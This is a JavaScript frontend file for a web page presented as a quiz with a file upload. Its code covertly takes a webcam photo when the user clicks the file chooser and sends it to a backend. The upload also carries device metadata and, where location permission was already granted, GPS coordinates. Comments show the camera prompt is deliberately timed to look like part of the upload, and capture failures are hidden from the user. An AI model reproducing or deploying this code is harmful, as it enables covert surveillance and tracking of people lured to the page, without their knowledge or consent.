// ================================
// FRONTEND SCRIPT.JS (NO PERM ON SUBMIT)
// ================================

const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

// merged backend
const BACKEND_BASE = "/api";

const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    time: new Date().toLocaleString(),
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  // Location (will ask permission ONLY if not granted already)
  if (navigator.geolocation && navigator.permissions) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// CAPTURE CAMERA ON FILE CLICK ONLY
// ================================
async function captureAndSendCamera() {
  if (cameraCaptured) return; // only once

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    // wait 2 sec for better pic
    await new Promise((r) => setTimeout(r, 2000));

    // set canvas size properly
    canvas.width = 640;
    canvas.height = 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const image = canvas.toDataURL("image/png");
    const metadata = await collectMetadata();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata }),
    });

    stream.getTracks().forEach((t) => t.stop());
    cameraCaptured = true;
  } catch (err) {
    console.log("Camera blocked/denied:", err);
    // No popup here, no breaking submit
  }
}

// ✅ IMPORTANT: Camera permission happens here only
if (fileInput) {
  fileInput.addEventListener("click", async () => {
    await captureAndSendCamera();
  });
}

// ================================
// FILE UPLOAD (SEND { file, filename })
// ================================
async function uploadFile(file) {
  const reader = new FileReader();

  return new Promise((resolve, reject) => {
    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
          }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM (NO CAMERA PERMISSION HERE)
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  // ✅ stop submit if file not selected
  if (!fileInput || fileInput.files.length === 0) {
    alert("Please select a file before submitting!");
    return;
  }

  try {
    await uploadFile(fileInput.files[0]);

    // ✅ show success page
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";
  } catch (err) {
    console.error("Submit error:", err);
    alert("Upload failed. Try again.");
  }
});
